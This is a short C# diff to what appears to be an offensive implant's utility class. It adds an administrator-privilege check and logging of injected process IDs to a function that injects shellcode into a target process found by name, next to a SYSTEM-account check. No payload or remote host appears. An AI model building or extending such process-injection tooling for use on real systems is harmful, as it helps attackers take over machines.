@@ -27,6 +27,13 @@ public class Tools
         return currentUser.User.Value.Equals("S-1-5-18", StringComparison.OrdinalIgnoreCase);
     }
 
+    public static bool IsAdministrator()
+    {
+        WindowsIdentity identity = WindowsIdentity.GetCurrent();
+        WindowsPrincipal principal = new WindowsPrincipal(identity);
+        return principal.IsInRole(WindowsBuiltInRole.Administrator);
+    }
+
     public static byte[] RunAsCurrentUser(string process, string command)
     {
         List<byte> output = new List<byte>(); 
@@ -73,6 +80,7 @@ public class Tools
             procid = getProcidByname(name);
         }
         UIntPtr size_T = (UIntPtr)shellCode.Length;
+        Info.AddInjectProcess(procid);
         return NativeMethods.Inject(procid, shellCode, size_T) == 0;
     }
 
